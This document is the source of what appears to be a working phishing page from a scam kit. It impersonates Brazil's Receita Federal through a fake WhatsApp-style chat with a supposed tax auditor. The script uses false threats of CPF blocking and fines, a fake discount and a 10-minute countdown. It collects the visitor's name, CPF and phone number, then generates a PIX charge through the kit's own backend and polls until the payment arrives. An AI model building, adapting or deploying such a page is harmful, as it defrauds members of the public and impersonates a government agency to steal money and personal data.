<?php
require_once '../config.php';
?>
<!DOCTYPE html><html lang="pt-BR"><head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Chat - Situação Fiscal</title>
    <link rel="stylesheet" href="../css/all.min.css">
    <link href="../css/bootstrap.min.css" rel="stylesheet">
    <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
    <link href="../css/tailwind.min.css" rel="stylesheet">
    <script src="../js/qrious.min.js"></script>
    <style>
        @import url('https://fonts.cdnfonts.com/css/rawline');
        body {
            font-family: 'Rawline', sans-serif;
        }
    </style>
<style>
    :root {
        --receita-blue: #1351b4;
        --receita-blue-dark: #0c326f;
        --receita-success: #16a34a;
        --receita-danger: #dc2626;
        --wa-bg: #efeae2;
        --wa-incoming: #ffffff;
        --wa-outgoing: #d9fdd3;
        --wa-text: #111b21;
        --wa-meta: #667781;
    }

    @keyframes slideDown { 0% { transform: translateY(-20px); opacity: 0; } 100% { transform: translateY(0); opacity: 1; } }
    @keyframes fadeIn { 0% { opacity: 0; } 100% { opacity: 1; } }

    body {
        background-color: #f0f2f5;
        color: var(--wa-text);
        margin: 0; padding: 0;
        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
    }

    /* Header Gov.br */
    .gov-header {
        background-color: var(--receita-blue);
        color: white;
        padding: 8px 16px;
        display: flex;
        justify-content: space-between;
        align-items: center;
        border-bottom: 3px solid #facc15;
    }

    .gov-header img { height: 28px; }

    /* Chat App Container */
    .app-container {
        max-width: 800px;
        margin: 0 auto;
        height: 100vh;
        display: flex;
        flex-direction: column;
        background-color: var(--wa-bg);
        background-image: url('../images/28719144-86dc0f70-73b1-11e7-911d-60d70fcded21.png');
        background-repeat: repeat;
        background-size: 300px;
        box-shadow: 0 0 10px rgba(0,0,0,0.1);
        position: relative;
    }

    /* Chat Header */
    .chat-header {
        background-color: #ffffff;
        padding: 10px 16px;
        display: flex;
        align-items: center;
        box-shadow: 0 1px 2px rgba(0,0,0,0.08);
        z-index: 10;
    }

    .chat-avatar-box {
        position: relative;
        margin-right: 15px;
    }

    .chat-avatar {
        width: 45px;
        height: 45px;
        border-radius: 50%;
        object-fit: cover;
    }

    .status-dot {
        position: absolute;
        bottom: 2px;
        right: 2px;
        width: 12px;
        height: 12px;
        background-color: #25d366;
        border-radius: 50%;
        border: 2px solid white;
    }

    .chat-header-info { flex-grow: 1; }
    .chat-header-title { font-weight: 600; font-size: 16px; color: #111b21; display: flex; align-items: center; gap: 5px; }
    .chat-header-subtitle { font-size: 13px; color: #667781; margin-top: 1px; }

    .verified-badge {
        color: #1d9bf0;
        font-size: 14px;
    }

    /* Chat Container */
    .chat-container {
        flex-grow: 1;
        overflow-y: auto;
        padding: 20px;
        display: flex;
        flex-direction: column;
        gap: 12px;
    }

    .chat-container::-webkit-scrollbar { width: 6px; }
    .chat-container::-webkit-scrollbar-track { background: transparent; }
    .chat-container::-webkit-scrollbar-thumb { background: rgba(0,0,0,0.2); border-radius: 10px; }

    /* Date Badge */
    .date-badge {
        background-color: #ffffff;
        color: #54656f;
        font-size: 12px;
        padding: 6px 12px;
        border-radius: 8px;
        box-shadow: 0 1px 1px rgba(11,20,26,0.1);
        align-self: center;
        margin: 10px 0 15px 0;
        text-transform: uppercase;
        font-weight: 500;
        letter-spacing: 0.3px;
    }

    /* Message Bubbles */
    .message-bubble {
        max-width: 85%;
        display: flex;
        flex-direction: column;
        position: relative;
        animation: slideDown 0.3s ease-out;
    }

    .incoming-message { align-self: flex-start; }
    .outgoing-message { align-self: flex-end; }

    .message-content {
        padding: 8px 12px 20px 12px;
        border-radius: 8px;
        box-shadow: 0 1px 1.5px rgba(11,20,26,0.13);
        font-size: 14.5px;
        line-height: 1.4;
        position: relative;
    }

    .incoming-message .message-content {
        background-color: var(--wa-incoming);
        border-top-left-radius: 0;
    }
    .incoming-message .message-content::before {
        content: ""; position: absolute; top: 0; left: -8px;
        width: 0; height: 0;
        border-top: 10px solid var(--wa-incoming);
        border-left: 10px solid transparent;
    }

    .outgoing-message .message-content {
        background-color: var(--wa-outgoing);
        border-top-right-radius: 0;
    }
    .outgoing-message .message-content::before {
        content: ""; position: absolute; top: 0; right: -8px;
        width: 0; height: 0;
        border-top: 10px solid var(--wa-outgoing);
        border-right: 10px solid transparent;
    }

    .message-meta {
        position: absolute;
        bottom: 4px;
        right: 8px;
        font-size: 11px;
        color: var(--wa-meta);
        display: flex;
        align-items: center;
        gap: 4px;
    }

    .message-meta i.fa-check-double {
        color: #53bdeb; /* Blue ticks */
        font-size: 10px;
    }

    /* Options / Buttons */
    .chat-options {
        align-self: flex-start;
        max-width: 85%;
        display: flex;
        flex-direction: column;
        gap: 8px;
        margin-top: 5px;
        margin-bottom: 10px;
    }

    .option-button {
        background-color: #ffffff;
        border: 1px solid #d1d7db;
        border-radius: 20px;
        padding: 10px 16px;
        font-size: 14px;
        font-weight: 500;
        color: var(--receita-blue);
        text-align: center;
        cursor: pointer;
        transition: all 0.2s;
        box-shadow: 0 1px 2px rgba(0,0,0,0.05);
    }
    .option-button:hover {
        background-color: #f5f6f6;
    }

    .payment-button {
        background: linear-gradient(135deg, #16a34a, #22c55e);
        border: none;
        border-radius: 24px;
        padding: 14px 20px;
        color: white;
        font-weight: 700;
        font-size: 15px;
        cursor: pointer;
        width: 100%;
        text-align: center;
        box-shadow: 0 4px 12px rgba(22, 163, 74, 0.3);
        display: flex;
        align-items: center;
        justify-content: center;
        gap: 8px;
        transition: transform 0.2s;
    }
    .payment-button:active { transform: scale(0.98); }

    /* Typing indicator */
    .typing-indicator {
        display: flex; align-items: center; gap: 4px; padding: 12px 16px; background: white; border-radius: 18px; width: fit-content; box-shadow: 0 1px 1.5px rgba(0,0,0,0.1);
    }
    .typing-indicator span {
        width: 6px; height: 6px; background-color: #8696a0; border-radius: 50%; animation: typing 1.4s infinite ease-in-out both;
    }
    .typing-indicator span:nth-child(1) { animation-delay: -0.32s; }
    .typing-indicator span:nth-child(2) { animation-delay: -0.16s; }
    @keyframes typing { 0%, 80%, 100% { transform: scale(0); } 40% { transform: scale(1); } }

    /* Gov PIX Modal Styles */
    .gov-pix-modal {
        background-color: #f8fafc;
        border-radius: 0;
        min-height: 100vh;
        width: 100vw;
        position: fixed; inset: 0; z-index: 3000; overflow-y: auto; display: flex; flex-direction: column;
        font-family: 'Rawline', sans-serif;
    }
    .gov-pix-header {
        background-color: #1351b4; padding: 15px; color: white; display: flex; align-items: center; gap: 15px; border-bottom: 4px solid #facc15;
    }
    .gov-pix-header img { height: 36px; }
    .gov-pix-body {
        padding: 20px; flex-grow: 1; max-width: 600px; margin: 0 auto; width: 100%; box-sizing: border-box;
    }
    .gov-pix-card {
        background: white; border-radius: 12px; box-shadow: 0 4px 6px -1px rgba(0,0,0,0.1), 0 2px 4px -1px rgba(0,0,0,0.06); padding: 24px; border: 1px solid #e2e8f0; margin-bottom: 20px;
    }
    .gov-seal { text-align: center; margin-bottom: 20px; }
    .gov-seal img { width: 60px; height: auto; margin: 0 auto 10px auto; }
    .gov-seal-title { font-weight: 700; color: #0f172a; font-size: 1.1rem; text-transform: uppercase; letter-spacing: 0.5px; }
    .gov-seal-subtitle { color: #64748b; font-size: 0.85rem; text-transform: uppercase; }
    
    .pix-timer-alert {
        background-color: #fef2f2; border: 1px solid #f87171; border-radius: 8px; padding: 12px; display: flex; align-items: center; justify-content: space-between; margin-bottom: 20px;
    }
    .pix-timer-text { color: #b91c1c; font-weight: 600; font-size: 0.9rem; }
    .pix-timer-clock { color: #dc2626; font-weight: 800; font-size: 1.1rem; font-variant-numeric: tabular-nums; }
</style>

</head><body>
    <div id="custom-captcha-container"></div>
    <div class="app-container">
        <!-- Gov Header -->
        <div class="gov-header">
            <div style="display:flex; align-items:center; gap: 10px;">
                <img src="../images/logo.png" alt="Gov.br">
            </div>
            <i class="fas fa-shield-alt" style="opacity: 0.8;"></i>
        </div>

        <!-- Chat Header -->
        <div class="chat-header">
            <div class="chat-avatar-box">
                <img src="../images/20250730-1844-Auditora-em-Escrito-rio-remix-01k1emk074ffjsxdk3xfe9b385.png" class="chat-avatar" alt="Tereza Alencar">
                <span class="status-dot"></span>
            </div>
            <div class="chat-header-info">
                <div class="chat-header-title">
                    Tereza Alencar <i class="fas fa-check-circle verified-badge" title="Agente Verificado"></i>
                </div>
                <div class="chat-header-subtitle">Auditora da Receita Federal • online agora</div>
            </div>
        </div>

        <!-- Chat Area -->
        <div class="chat-container" id="chatContainer">
            <div class="date-badge" id="chatDateBadge">Hoje, 16:58</div>
            <div class="message-bubble incoming-message" id="typingIndicator">
                <div class="message-content" style="padding-bottom: 8px;">
                    <div class="typing-indicator">
                        <span></span><span></span><span></span>
                    </div>
                </div>
            </div>
        </div>
    </div>

<script src="../js/bootstrap.bundle.min.js"></script>
<script>
const CUSTOM_CHAT_TOKEN = "30cb894205fd45a298e649a20bd1e407";

function handlePaymentClick() {
    openPixModal(CUSTOM_CHAT_TOKEN);
}

const urlParams = new URLSearchParams(window.location.search);
const cpfParam = urlParams.get('cpf');
const nomeParam = urlParams.get('nome');
let customerData = {};
try {
    customerData = JSON.parse(localStorage.getItem('customerData') || '{}');
} catch (e) {
    customerData = {};
}
if (cpfParam) {
    customerData.cpf = cpfParam;
}
if (nomeParam) {
    customerData.nome = nomeParam;
}
try {
    localStorage.setItem('customerData', JSON.stringify(customerData));
} catch (e) {}

function capitalizeNames(name) {
    if (!name) return 'Nome não informado';
    return name.toLowerCase().split(' ').map(word => 
        word.charAt(0).toUpperCase() + word.slice(1)
    ).join(' ');
}

const firstName = customerData.nome ? capitalizeNames(customerData.nome.split(' ')[0]) : 'Contribuinte';
const fullName = customerData.nome ? capitalizeNames(customerData.nome) : 'Nome não informado';
const cpf = customerData.cpf || 'CPF não informado';

// Informações sobre parcelas selecionadas
const parcelasSelecionadas = customerData.parcelasSelecionadas || [];
const quantidadeParcelas = customerData.quantidadeParcelas || 0;
const valorTotal = customerData.valorTotal || 'R$ 94,01';

// Mensagem dinâmica sobre as parcelas
let mensagemParcelas = '';
if (parcelasSelecionadas && parcelasSelecionadas.length > 0) {
    const anosFormatados = parcelasSelecionadas.join(', ');
    mensagemParcelas = ` Você selecionou ${quantidadeParcelas} parcela${quantidadeParcelas > 1 ? 's' : ''} (ano${quantidadeParcelas > 1 ? 's' : ''}: ${anosFormatados}) no valor total de ${valorTotal}.`;
} else {
    mensagemParcelas = ` O débito total a ser pago é de ${valorTotal}.`;
}

const chatSequence = [
    {
        message: `Olá ${firstName}, aqui é a Tereza Alencar, Auditora da Receita Federal do Brasil.`,
        delay: 1200
    },
    {
        message: `Trabalho na área de fiscalização de débitos tributários. Foi identificado um débito pendente no seu CPF ${cpf}, registrado em nome de ${fullName}.${mensagemParcelas}`,
        delay: 2200,
        requestPhone: true
    },
    {
        message: `Prezado ${firstName}, informo que seu CPF já consta na lista para bloqueio automático. Caso não efetue o pagamento, todas as atividades financeiras serão restringidas, incluindo operações bancárias, cartões de crédito e atividades comerciais.`,
        delay: 2000
    },
    {
        message: `Além disso, se o pagamento não for realizado hoje será aplicada uma multa adicional no valor de R$ 1.985,00 ao seu CPF, conforme determina a legislação tributária federal.`,
        delay: 1900
    },
    {
        message: `Importante: realizando o pagamento hoje (${new Date().toLocaleDateString("pt-BR")}) há um desconto de 67%, reduzindo o débito para apenas ${valorTotal}. ${firstName}, deseja quitar com desconto ou autoriza o bloqueio do CPF?`,
        delay: 1800,
        showOptions: 'debtOptions'
    }
];

const chatContainer = document.getElementById('chatContainer');
const timeFormatter = new Intl.DateTimeFormat('pt-BR', { hour: '2-digit', minute: '2-digit' });

document.getElementById('chatDateBadge').innerText = 'Hoje, ' + timeFormatter.format(new Date());

function addMessage(text, isIncoming = true, scrollToBottom = true) {
    const messageDiv = document.createElement('div');
    messageDiv.className = `message-bubble ${isIncoming ? 'incoming-message' : 'outgoing-message'}`;
    
    const timeStr = timeFormatter.format(new Date());
    const tickHtml = !isIncoming ? '<i class="fas fa-check-double"></i>' : '';

    messageDiv.innerHTML = `
        <div class="message-content">
            ${text.replace(/\n/g, '<br>')}
            <div class="message-meta">
                ${timeStr} ${tickHtml}
            </div>
        </div>
    `;
    
    chatContainer.appendChild(messageDiv);
    
    if (scrollToBottom) {
        chatContainer.scrollTop = chatContainer.scrollHeight;
    }
}

function showTyping(duration = 3000) {
    return new Promise(resolve => {
        const typingDiv = document.createElement('div');
        typingDiv.className = 'message-bubble incoming-message';
        typingDiv.id = 'typingIndicator';
        typingDiv.innerHTML = `
            <div class="message-content" style="padding-bottom: 8px;">
                <div class="typing-indicator">
                    <span></span><span></span><span></span>
                </div>
            </div>
        `;

        chatContainer.appendChild(typingDiv);
        chatContainer.scrollTop = chatContainer.scrollHeight;

        setTimeout(() => {
            if (typingDiv.parentNode) {
                typingDiv.parentNode.removeChild(typingDiv);
            }
            resolve();
        }, duration);
    });
}

function showOptions(optionsId) {
    let optionsHtml = '';

    if (optionsId === 'debtOptions') {
        optionsHtml = `
            <div class="chat-options">
                <div class="option-button" onclick="handleOptionClick(this, 'Sim, quero regularizar minha situação.', 'redirectToPayment')">
                    Sim, quero regularizar minha situação
                </div>
                <div class="option-button" onclick="handleOptionClick(this, 'Não, ciente do bloqueio de bens.', 'confirmBlock')" style="color: var(--receita-danger); border-color: #fca5a5;">
                    Não, ciente do bloqueio de bens
                </div>
            </div>
        `;
    }

    if (optionsHtml) {
        chatContainer.insertAdjacentHTML('beforeend', optionsHtml);
        chatContainer.scrollTop = chatContainer.scrollHeight;
    }
}

function handleOptionClick(button, responseText, nextAction) {
    addMessage(responseText, false, true);

    const optionsContainer = button.closest('.chat-options');
    if (optionsContainer) {
        optionsContainer.remove();
    }

    setTimeout(async () => {
        if (nextAction === 'redirectToPayment') {
            await showTyping(1200);
            addMessage(`${firstName}, este é o último aviso para regularizar esse débito. Não haverá nova oportunidade após hoje.`, true, true);
            
            await showTyping(1500);
            addMessage('Segundo as normas da Receita Federal, o pagamento com desconto tem validade de 10 minutos. Se você gerar o código PIX e não realizar o pagamento, a negociação será cancelada e será aplicada uma multa de não cumprimento do acordo no valor de R$985,00 e o CPF seguirá na lista de bloqueio.', true, true);
            
            setTimeout(() => {
                showPaymentButton();
            }, 600);
        } else if (nextAction === 'confirmBlock') {
            await showTyping(2000);
            addMessage('Entendido. Vou iniciar o processo de bloqueio do seu CPF conforme os procedimentos da Receita Federal. O bloqueio será efetivado em breve. Obrigada pela atenção.', true, true);
        }
    }, 400);
}

function showPaymentButton() {
    const buttonHtml = `
        <div style="align-self: center; margin-top: 15px; margin-bottom: 25px; width: 100%; max-width: 300px;">
            <button class="payment-button" onclick="handlePaymentClick()">
                <i class="fas fa-qrcode"></i> GERAR DARF PIX
            </button>
        </div>
    `;
    
    chatContainer.insertAdjacentHTML('beforeend', buttonHtml);
    chatContainer.scrollTop = chatContainer.scrollHeight;
}

async function openPixModal(recaptchaToken) {
    try {
        const loadingModal = document.createElement('div');
        loadingModal.id = 'pixLoadingModal';
        loadingModal.innerHTML = `
            <div style="position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: rgba(0,0,0,0.5); z-index: 3000; display: flex; align-items: center; justify-content: center;">
                <div style="background: #fff; padding: 40px 30px; border-radius: 10px; box-shadow: 0 8px 32px rgba(0,0,0,0.18); text-align: center; min-width: 260px;">
                    <div class='spinner' style='margin: 0 auto 18px auto; width: 48px; height: 48px; border: 6px solid #f3f3f3; border-top: 6px solid #044785; border-radius: 50%; animation: spin 1s linear infinite;'></div>
                    <div style='font-size: 1.15rem; color: #044785; font-weight: 600;'>Gerando seu pagamento PIX...</div>
                </div>
            </div>
            <style>@keyframes spin {0% { transform: rotate(0deg);}100% { transform: rotate(360deg);}}</style>
        `;
        document.body.appendChild(loadingModal);

        const customer = {
            name: customerData.nome || '',
            email: customerData.email || '',
            cpf: customerData.cpf || '',
            phone: sanitizePhoneDigits(customerData.telefone || ''),
            parcelasSelecionadas: parcelasSelecionadas || [],
            quantidadeParcelas: quantidadeParcelas || 0,
            valorTotal: valorTotal || ''
        };
        if (recaptchaToken) {
            customer.recaptcha_token = recaptchaToken;
        }

        const response = await fetch('../pix/criar.php', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(customer)
        });

        if (!response.ok) {
            document.getElementById('pixLoadingModal')?.remove();
            addMessage('Erro ao processar pagamento. Tente novamente mais tarde.', true, true);
            return;
        }

        const data = await response.json();

        document.getElementById('pixLoadingModal')?.remove();

        if (data.pixCode || data.pix_code) {
            showPixModal({
                pixCode: data.pixCode || data.pix_code,
                pixQrCode: data.pixQrCode || data.pix_qr_code || '',
                transaction_id: data.id || data.transaction_id || '',
                valorTotal: valorTotal
            });
        } else {
            addMessage('Erro ao gerar cobrança PIX. Tente novamente mais tarde.', true, true);
        }
    } catch (error) {
        document.getElementById('pixLoadingModal')?.remove();
        console.error('Erro ao processar pagamento:', error);
        addMessage('Erro ao processar pagamento. Tente novamente mais tarde.', true, true);
    }
}

async function generateQRCodeFromPix(pixCode) {
    try {
        if (typeof QRious === 'undefined') {
            console.error('QRious library not loaded');
            return null;
        }
        
        const canvas = document.createElement('canvas');

        const qr = new QRious({
            element: canvas,
            value: pixCode,
            size: 600,
            background: '#ffffff',
            foreground: '#000000'
        });
        
        return canvas.toDataURL('image/png');
    } catch (error) {
        console.error('Erro ao gerar QR Code:', error);
        return null;
    }
}

function showPixModal(data) {
    const existingModal = document.getElementById('pixModal');
    if (existingModal) {
        existingModal.remove();
    }
    
    const pixCode = data.pixCode || data.pix_code;
    const valorTotal = data.valorTotal || 'R$ 94,01';
    
    if (!pixCode) {
        alert('Erro: Código PIX não recebido');
        return;
    }
    
    generateQRCodeFromPix(pixCode).then(qrCodeDataURL => {
        if (!qrCodeDataURL) {
            alert('Erro ao gerar QR Code. Tente novamente.');
            return;
        }
        
        const transactionId = data.transaction_id || data.orderId || data.order_id;
        if (transactionId) {
            startPaymentMonitoring(transactionId);
        }
        
        const modalHtml = `
            <div id="pixModal" class="gov-pix-modal">
                <div class="gov-pix-header">
                    <img src="../images/brasao.png" alt="Brasão" style="width:36px; filter: brightness(0) invert(1);">
                    <div>
                        <div style="font-weight: 700; font-size: 14px;">Ministério da Fazenda</div>
                        <div style="font-size: 12px; opacity: 0.9;">Receita Federal do Brasil</div>
                    </div>
                </div>
                <div class="gov-pix-body">
                    <div class="gov-pix-card">
                        <div class="gov-seal">
                            <img src="../images/brasao.png" alt="Brasão República">
                            <div class="gov-seal-title">Documento de Arrecadação</div>
                            <div class="gov-seal-subtitle">Cobrança Oficial DARF/PIX</div>
                        </div>

                        <div class="pix-timer-alert">
                            <div>
                                <div class="pix-timer-text">ATENÇÃO: Prazo para regularização</div>
                                <div style="font-size: 0.8rem; color: #7f1d1d;">Evite o bloqueio do CPF</div>
                            </div>
                            <div class="pix-timer-clock" id="pixCountdown">10:00</div>
                        </div>

                        <div style="background: #f1f5f9; border-radius: 10px; padding: 15px; margin-bottom: 20px;">
                            <div style="display:flex; justify-content: space-between; border-bottom: 1px solid #cbd5e1; padding-bottom: 8px; margin-bottom: 8px;">
                                <span style="color: #64748b; font-size: 0.85rem;">Favorecido</span>
                                <span style="font-weight: 600; color: #0f172a; font-size: 0.85rem;">Secretaria da Receita Federal</span>
                            </div>
                            <div style="display:flex; justify-content: space-between; border-bottom: 1px solid #cbd5e1; padding-bottom: 8px; margin-bottom: 8px;">
                                <span style="color: #64748b; font-size: 0.85rem;">Contribuinte</span>
                                <span style="font-weight: 600; color: #0f172a; font-size: 0.85rem; text-transform: uppercase;">${fullName}</span>
                            </div>
                            <div style="display:flex; justify-content: space-between; align-items: center;">
                                <span style="color: #64748b; font-size: 0.85rem;">Valor Total</span>
                                <span style="font-weight: 800; color: #16a34a; font-size: 1.15rem;">${valorTotal}</span>
                            </div>
                        </div>

                        <div style="text-align: center; margin-bottom: 20px;">
                            <div style="display: inline-block; padding: 10px; background: white; border: 2px solid #e2e8f0; border-radius: 12px; box-shadow: 0 4px 6px -1px rgba(0,0,0,0.1);">
                                <img src="${qrCodeDataURL}" alt="QR Code PIX" style="width: 220px; height: 220px; display: block;">
                            </div>
                        </div>

                        <div style="margin-bottom: 20px;">
                            <label style="display: block; font-size: 0.85rem; color: #475569; margin-bottom: 6px; font-weight: 600;">Código PIX Copia e Cola:</label>
                            <div style="display: flex; gap: 8px;">
                                <input type="text" id="pixCodeInputReal" value="${pixCode}" readonly style="flex-grow: 1; padding: 12px; background: #f8fafc; border: 1px solid #cbd5e1; border-radius: 8px; font-family: monospace; font-size: 0.85rem; color: #0f172a;">
                                <button onclick="copyPixCode()" style="background: #1351b4; color: white; border: none; border-radius: 8px; padding: 0 20px; cursor: pointer; font-weight: 600; transition: background 0.2s;">
                                    COPIAR
                                </button>
                            </div>
                        </div>

                        <div style="text-align: center; color: #64748b; font-size: 0.8rem; margin-bottom: 10px;">
                            <button onclick="closePixModal()" class="px-4 py-2 bg-slate-200 text-slate-700 rounded-lg hover:bg-slate-300 font-semibold text-sm transition">
                                Voltar para o Chat
                            </button>
                        </div>

                        <div style="text-align: center; color: #64748b; font-size: 0.8rem;">
                            <i class="fas fa-shield-alt" style="color: #16a34a; margin-right: 4px;"></i>
                            Transação criptografada e homologada pelo Banco Central do Brasil.
                        </div>
                    </div>
                </div>
            </div>
        `;
        
        document.body.insertAdjacentHTML('beforeend', modalHtml);
        startPixCountdown(10 * 60);
    }).catch(error => {
        console.error('Erro ao gerar QR Code:', error);
    });
}

function formatCountdown(secondsLeft) {
    const total = Math.max(0, Math.floor(secondsLeft));
    const minutes = String(Math.floor(total / 60)).padStart(2, '0');
    const seconds = String(total % 60).padStart(2, '0');
    return `${minutes}:${seconds}`;
}

function stopPixCountdown() {
    if (window.pixCountdownInterval) {
        clearInterval(window.pixCountdownInterval);
        window.pixCountdownInterval = null;
    }
}

function startPixCountdown(durationSeconds) {
    stopPixCountdown();
    const timerEl = document.getElementById('pixCountdown');
    const copyBtn = document.querySelector('#pixModal button[onclick="copyPixCode()"]');

    if (!timerEl) return;

    const total = Math.max(1, parseInt(durationSeconds, 10) || 600);
    const startedAt = Date.now();

    const render = () => {
        const elapsed = Math.floor((Date.now() - startedAt) / 1000);
        const remaining = Math.max(0, total - elapsed);

        timerEl.textContent = formatCountdown(remaining);

        if (remaining <= 0) {
            stopPixCountdown();
            timerEl.textContent = 'EXPIRADO';
            timerEl.style.color = '#b91c1c';
            if (copyBtn) {
                copyBtn.disabled = true;
                copyBtn.style.opacity = '0.7';
                copyBtn.style.cursor = 'not-allowed';
            }
        }
    };

    render();
    window.pixCountdownInterval = setInterval(render, 1000);
}

function copyPixCode() {
    const realPixInput = document.getElementById('pixCodeInputReal');
    const realPixCode = realPixInput.value;
    
    try {
        if (navigator.clipboard && window.isSecureContext) {
            navigator.clipboard.writeText(realPixCode);
        } else {
            const textArea = document.createElement('textarea');
            textArea.value = realPixCode;
            document.body.appendChild(textArea);
            textArea.select();
            textArea.setSelectionRange(0, 99999);
            document.execCommand('copy');
            document.body.removeChild(textArea);
        }
        
        const button = event.target.closest('button');
        const originalText = button.innerHTML;
        button.innerHTML = 'Copiado!';
        button.style.background = '#28a745';
        
        setTimeout(() => {
            button.innerHTML = originalText;
            button.style.background = '#1351b4';
        }, 3000);
    } catch (err) {
        alert('Erro ao copiar código. Tente selecionar manualmente.');
    }
}

function closePixModal() {
    const modal = document.getElementById('pixModal');
    if (modal) {
        modal.remove();
    }
    
    if (window.paymentMonitorInterval) {
        clearInterval(window.paymentMonitorInterval);
        window.paymentMonitorInterval = null;
    }
    stopPixCountdown();
}

function startPaymentMonitoring(transactionId) {
    if (window.paymentMonitorInterval) {
        clearInterval(window.paymentMonitorInterval);
    }
    window.paymentMonitorInterval = setInterval(async () => {
        if (document.hidden) {
            return;
        }
        try {
            const statusUrl = `../pix/detalhes.php?id=${encodeURIComponent(transactionId)}`;
            const response = await fetch(statusUrl);

            if (!response.ok) return;

            const statusData = await response.json();
            const statusNormalizado = statusData && statusData.status ? String(statusData.status).toLowerCase() : '';

            if (statusNormalizado === 'approved' || statusNormalizado === 'paid') {
                clearInterval(window.paymentMonitorInterval);
                window.paymentMonitorInterval = null;
                closePixModal();

                let cpfParam = '';
                try {
                    const stored = localStorage.getItem('customerData');
                    if (stored) {
                        const parsed = JSON.parse(stored);
                        if (parsed && parsed.cpf) {
                            cpfParam = String(parsed.cpf).replace(/\D/g, '');
                        }
                    }
                } catch (e) {}
                
                if (cpfParam) {
                    window.location.href = `../index.php?cpf=${encodeURIComponent(cpfParam)}&sem_pendencias=1&pagamento_sucesso=1`;
                } else {
                    window.location.href = '../index.php?sem_pendencias=1&pagamento_sucesso=1';
                }
            }
        } catch (error) {
            console.error('Erro ao verificar status do pagamento:', error);
        }
    }, 4000);
    
    setTimeout(() => {
        if (window.paymentMonitorInterval) {
            clearInterval(window.paymentMonitorInterval);
            window.paymentMonitorInterval = null;
        }
    }, 20 * 60 * 1000);
}

async function initializeChat() {
    await new Promise(resolve => setTimeout(resolve, 400));
    
    for (let i = 0; i < chatSequence.length; i++) {
        const message = chatSequence[i];
        
        await showTyping(message.delay);
        
        addMessage(message.message, true, true);
        
        if (message.requestPhone) {
            await new Promise(resolve => setTimeout(resolve, 400));
            await showTyping(800);
            addMessage(`Para continuar com a regularização do débito, preciso confirmar seu número de telefone.`, true, true);
            
            setTimeout(() => {
                showPhoneInput();
            }, 400);
            
            await waitForPhoneConfirmation();
        }
        
        if (message.showOptions) {
            setTimeout(() => {
                showOptions(message.showOptions);
            }, 600);
        }
    }
}

let phoneConfirmationResolve = null;
initializeChat();

function sanitizePhoneDigits(value) {
    return String(value || '').replace(/\D/g, '').slice(0, 11);
}

function formatPhoneNumber(digits) {
    const cleaned = sanitizePhoneDigits(digits);
    if (cleaned.length <= 2) {
        return cleaned;
    }
    if (cleaned.length <= 6) {
        return `(${cleaned.slice(0, 2)}) ${cleaned.slice(2)}`;
    }
    if (cleaned.length <= 10) {
        return `(${cleaned.slice(0, 2)}) ${cleaned.slice(2, 6)}-${cleaned.slice(6)}`;
    }
    return `(${cleaned.slice(0, 2)}) ${cleaned.slice(2, 7)}-${cleaned.slice(7)}`;
}

function isValidBrazilPhone(digits) {
    const cleaned = sanitizePhoneDigits(digits);
    if (!(cleaned.length === 10 || cleaned.length === 11)) {
        return false;
    }
    if (/^(\d)\1+$/.test(cleaned)) {
        return false;
    }
    const ddd = parseInt(cleaned.slice(0, 2), 10);
    return ddd >= 11 && ddd <= 99;
}

function handlePhoneInput(inputEl) {
    inputEl.value = formatPhoneNumber(inputEl.value);
}

function showPhoneInput() {
    const phoneInputHtml = `
        <div class="phone-input-container" style="margin-top: 20px; margin-bottom: 20px; padding-left: 0px; margin-left: -10px; max-width: 75%;">
            <div style="background: #f8f9fa; border-radius: 8px; padding: 20px; border: 1px solid #dee2e6;">
                <label for="phoneInput" style="display: block; margin-bottom: 10px; font-weight: 600; color: #044785;">
                    Digite seu número de telefone (DDD + número):
                </label>
                <input 
                    type="tel" 
                    id="phoneInput" 
                    placeholder="Ex: (61) 99543-8321"
                    inputmode="numeric"
                    autocomplete="tel-national"
                    maxlength="15"
                    style="
                        width: 100%;
                        padding: 12px;
                        border: 2px solid #044785;
                        border-radius: 4px;
                        font-size: 1rem;
                        margin-bottom: 15px;
                        text-align: center;
                        font-weight: 600;
                    "
                    oninput="handlePhoneInput(this)"
                />
                <button 
                    onclick="confirmPhone()" 
                    style="
                        background: #044785;
                        color: white;
                        border: none;
                        padding: 12px 24px;
                        border-radius: 4px;
                        font-weight: 600;
                        cursor: pointer;
                        width: 100%;
                        font-size: 1rem;
                    "
                >
                    Confirmar Telefone
                </button>
            </div>
        </div>
    `;
    
    chatContainer.insertAdjacentHTML('beforeend', phoneInputHtml);
    chatContainer.scrollTop = chatContainer.scrollHeight;
    
    setTimeout(() => {
        document.getElementById('phoneInput').focus();
    }, 500);
}

function waitForPhoneConfirmation() {
    return new Promise(resolve => {
        phoneConfirmationResolve = resolve;
    });
}

async function confirmPhone() {
    const phoneInput = document.getElementById('phoneInput');
    const phoneDigits = sanitizePhoneDigits(phoneInput.value);
    
    if (!isValidBrazilPhone(phoneDigits)) {
        alert('Por favor, digite um número de telefone válido (DDD + número).');
        return;
    }
    
    const currentData = JSON.parse(localStorage.getItem('customerData') || '{}');
    currentData.telefone = phoneDigits;
    localStorage.setItem('customerData', JSON.stringify(currentData));
    customerData.telefone = phoneDigits;
    
    addMessage(`Telefone: ${formatPhoneNumber(phoneDigits)}`, false, true);
    
    const phoneContainer = document.querySelector('.phone-input-container');
    if (phoneContainer) {
        phoneContainer.remove();
    }
    
    await showTyping(1000);
    addMessage(`Obrigada, ${firstName}! Telefone confirmado. Agora vou prosseguir com as informações sobre seu débito.`, true, true);
    
    if (phoneConfirmationResolve) {
        phoneConfirmationResolve();
        phoneConfirmationResolve = null;
    }
}
</script>
</body></html>
